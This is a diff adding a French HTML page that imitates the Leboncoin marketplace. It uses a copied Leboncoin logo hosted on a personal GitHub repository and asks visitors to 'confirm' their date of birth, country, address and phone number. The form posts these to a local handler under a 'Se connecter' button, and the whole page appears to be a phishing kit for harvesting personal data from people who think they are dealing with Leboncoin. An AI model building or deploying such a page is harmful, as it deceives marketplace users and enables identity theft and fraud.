@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmation des Informations</title>
+    <style>
+        /* Reset des marges et padding */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: url('https://raw.githubusercontent.com/zapata225/lebon/refs/heads/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20115029.png') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            overflow-y: auto; /* Pour permettre la barre de défilement */
+        }
+
+        /* Barre de titre avec logo */
+        .header-bar {
+            background: white; /* Fond blanc */
+            width: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            text-align: center;
+            padding: 0;
+            height: 120px; /* Limite la hauteur de la barre contenant le logo */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1;
+        }
+
+        .header-bar img {
+            width: 100vw; /* Le logo occupe toute la largeur de la fenêtre */
+            height: auto; /* Maintient la proportion du logo */
+        }
+
+        /* Espacement entre la barre et le formulaire */
+        .logo-container {
+            margin-top: 140px; /* Espace ajouté entre le logo et le formulaire */
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            width: 450px; /* Largeur du formulaire */
+            position: relative;
+            margin-top: 20px; /* Espacement supplémentaire */
+            z-index: 1;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+            margin-top: 15px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 14px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .login-button:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Barre de titre avec logo -->
+    <div class="header-bar">
+        <a href="https://www.leboncoin.fr" target="_blank">
+            <img src="https://raw.githubusercontent.com/zapata225/lebon/refs/heads/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20110632.png" alt="Logo Leboncoin">
+        </a>
+    </div>
+
+    <!-- Formulaire -->
+    <div class="container">
+        <h2>Confirmez vos informations</h2>
+        <form action="/traitement_confirmation" method="post">
+            <div class="input-group">
+                <label for="dob">Date de naissance (JJ/MM/AA)</label>
+                <input type="text" id="dob" name="dob" placeholder="JJ/MM/AA" required>
+            </div>
+
+            <div class="input-group">
+                <label for="pays">Pays</label>
+                <input type="text" id="pays" name="pays" placeholder="Votre pays" required>
+            </div>
+
+            <div class="input-group">
+                <label for="adresse">Adresse</label>
+                <input type="text" id="adresse" name="adresse" placeholder="Votre adresse" required>
+            </div>
+
+            <div class="input-group">
+                <label for="telephone">Numéro de téléphone</label>
+                <input type="tel" id="telephone" name="telephone" placeholder="+33 6 12 34 56 78" required>
+            </div>
+
+            <button type="submit" class="login-button">Se connecter</button>
+        </form>
+    </div>
+
+</body>
+
+</html>
